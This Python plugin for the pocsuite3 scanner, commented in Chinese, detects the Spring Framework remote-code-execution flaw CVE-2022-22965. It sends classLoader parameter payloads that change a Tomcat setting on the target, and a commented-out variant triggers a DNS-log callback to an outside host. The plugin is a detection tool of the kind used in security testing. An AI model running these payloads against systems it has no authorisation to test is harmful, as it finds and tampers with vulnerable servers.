from pocsuite3.api import Output, POCBase, register_poc, requests
from urllib.parse import urlparse


class SpringCore(POCBase):
    vulID = 'CVE-2022-22965 | CNVD-2022-23942'  # 漏洞编号，若提交漏洞的同时提交PoC，则写成0
    version = 'v1.0'  # PoC版本，默认为1
    author = ['wyunan']  # 此PoC作者
    vulDate = '2022-04-01'  # 漏洞公开日期
    createDate = '2022-04-02'  # 编写PoC日期
    updateDate = '2022-04-02'  # 更新PoC日期，默认与createDate一样
    references = ['https://mp.weixin.qq.com/s/Fzphum4fuYMQyMTDkKrsWA']  # 漏洞地址来源，0day不写
    name = 'CVE-2022-22965-SpingCoreRce漏洞检测插件'  # PoC名称
    appPowerLink = 'https://github.com/spring-projects/spring-framework/'  # 漏洞产商主页
    appName = 'Spring framework'  # 漏洞应用名称
    appVersion = '''
JDK版本号在9及以上，且使用了Spring框架或衍生框架的系统。
1. Spring Framework 5.3.X < 5.3.18 
2. Spring Framework 5.2.X < 5.2.20
                '''  # 漏洞影响版本
    vulType = '远程命令执行'  # 漏洞类型
    desc = '''
Spring框架存在一个远程命令执行漏洞，由于Spring框架存在处理流程缺陷，攻击者可远程实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。使用Spring框架或衍生框架构建网站等应用，且同时使用JDK版本在9及以上版本的，易受此漏洞攻击影响。
腾讯安全专家研判该漏洞为“高危”，目前该漏洞的技术细节、POC、EXP等相关代码均已公开，危害较大。
Spring框架（Framework）是一个开源的轻量级J2EE应用程序开发框架，提供了IOC、AOP及MVC等功能，解决了程序人员在开发中遇到的常见问题，提高了应用程序开发便捷度和软件系统构建效率。
            '''  # 在漏洞描述填写
    fixDesc = '''
    升级至Spring Framework = 5.3.18；Spring Framework = 5.2.20
    '''  # 修复建议
    samples = []  # 测试成功网址
    install_requires = []  # PoC依赖的第三方模块，尽量不要使用第三方模块，必要时参考后面给出的参考链接
    pocDesc = '''通过pip安装 pocsuite3 库，写入目标URL，通过该脚本检测'''  # 在PoC用法描述填写

    """
    检测方案一：可以更改tomcat的默认断言配置(class.module.classLoader.defaultAssertionStatus=xxx)，一般业务的默认断言配置为false。更改该配置对业务影响较小，所以暂时采用此种检测方法
    """
    def Detection_Scheme1(self, url):
        # 该payload可以更改tomcat的默认断言配置，一般业务的默认断言配置为false。更改该配置对业务影响较小，所以暂时采用此种检测方法
        init_poc = "class.module.classLoader.defaultAssertionStatus=%s"
        # 正常情况下，如果业务存在该漏洞，默认断言配置值定位随意字符串时，业务侧会加载classloader去更改配置，但因为配置只有true和false，所以会更改报错返回400
        poc1 = init_poc % "any test"
        # 业务一般断言配置值默认是false
        poc2 = init_poc % "false"
        # 首先poc1会将断言配置更改为任意字符串“any test”，如果业务受漏洞影响，会去加载，但因为defaultAssertionStatus只有TRUE和FALSE，所以会加载失败，返回400。
        # 其次，poc2会将断言配置更改为FALSE，业务默认属性值。
        poc1_res = requests.get(url, params=poc1, timeout=10, allow_redirects=False, verify=False)
        poc2_res = requests.get(url, params=poc2, timeout=10, allow_redirects=False, verify=False)
        # 如果需要用post形式则选取如下
        # poc1_res = requests.post(url, headers=headers, data=poc_data1, timeout=10, allow_redirects=False, verify=False)
        # poc2_res = requests.post(url, headers=headers, data=poc_data2, timeout=10, allow_redirects=False, verify=False)
        return poc1_res, poc2_res

    """
    检测方案二:一种DNSLOG的检测方法，是更改org.apache.catalina.core.StandardContext#getConfigFile中的url，会触发。
    """
    # MyDNSlog改成你的ceye地址，如果后续还想更精确的查看是否确实存在该漏洞，则可在该dnslog平台上查看记录。
    # MyDNSlog = "xxx.ceye.io"
    # def _gen_payload(self, init_payload: str, host: str) -> (str, str):
    #     path = str(host) + '.' + self.MyDNSlog
    #     payload = init_payload % path
    #     return payload, path
    #
    # def Detection_Scheme2(self, url):
    #     # 该configFile中url更改会触发dnslog
    #     init_dns_poc = "class.module.classLoader.resources.context.configFile=http://%s&class.module.classLoader.resources.context.configFile.content.aaa=xxx"
    #     host = urlparse(url).hostname
    #     dnslog_poc, path = self._gen_payload(init_payload=init_dns_poc, host=host)
    #     DNS_res = requests.get(url=url, params=dnslog_poc, timeout=10, allow_redirects=False, verify=False)
    #     # POST请求如下
    #     # DNS_res = requests.post(url=url, data=dnslog_poc, timeout=10, allow_redirects=False, verify=False)
    #     return dnslog_poc,DNS_res

    def _verify(self):
        result = {}
        try:
            url = self.url
            """
            检测方案一执行
            """
            poc1_res, poc2_res = self.Detection_Scheme1(url)
            if poc1_res.status_code == 400 and poc2_res.status_code == 200:
                result['VulResult'] = "success,存在Spring Core 远程命令执行漏洞"
            else:
                pass

            """
            检测方案二执行
            """
            # dnslog_poc, DNS_res = self.Detection_Scheme2(url)
            # 如果dnslog有接口验证请求，则在此处加判断逻辑，没有的话去dnslog平台看看有没有日志即可。

            return self.parse_output(result)

        except Exception as e:
            print("%s" % e)
            raise e

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(SpringCore)
